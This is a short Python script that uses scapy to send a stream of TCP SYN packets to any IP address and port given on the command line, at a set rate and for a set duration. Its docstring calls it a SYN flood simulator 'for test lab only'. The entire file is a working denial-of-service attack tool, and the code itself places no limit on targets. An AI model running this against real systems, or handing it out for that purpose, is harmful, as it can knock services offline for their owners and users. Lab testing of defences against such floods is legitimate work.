"""
Simple SYN flood simulator using scapy (for test lab only).
Usage (as root): python simulate_attack.py <target_ip> <target_port> <pps> <duration_sec>
Example: sudo python3 simulate_attack.py 192.168.1.10 80 1000 10
"""
import sys
import time
from scapy.all import IP, TCP, send

def syn_flood(dst_ip, dst_port, pps, duration):
    interval = 1.0/pps
    stop = time.time() + duration
    seq = 0
    while time.time() < stop:
        pkt = IP(dst=dst_ip)/TCP(dport=int(dst_port), flags='S', seq=seq)
        send(pkt, verbose=False)
        seq += 1
        time.sleep(interval)

if __name__ == '__main__':
    if len(sys.argv) < 5:
        print('Usage: simulate_attack.py <target_ip> <target_port> <pps> <duration_sec>')
        sys.exit(1)
    syn_flood(sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]))
